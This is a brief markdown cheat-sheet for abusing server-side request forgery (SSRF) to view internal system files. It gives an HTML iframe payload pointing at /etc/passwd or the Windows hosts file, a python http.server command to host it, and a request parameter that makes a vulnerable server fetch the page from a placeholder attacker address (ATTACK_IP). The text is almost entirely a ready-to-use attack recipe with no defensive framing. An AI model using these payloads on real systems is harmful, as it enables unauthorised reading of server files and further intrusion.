# SSRF

View internal system files by abusing SSRF

### 1) Create an HTML file with this content

Windows

    <iframe src="C:/Windows/system32/drivers/etc/hosts" height=1000 width=1000 />

Linux
    
    <iframe src="/etc/passwd" height=1000 width=1000 />

### 2) Host it on an HTTP server

    python3 -m http.server 80

### 3) Exploit SSRF

Example

    url=http://ATTACK_IP/index.html

Then, the file will be viewed as an iframe, just like in the HTML.
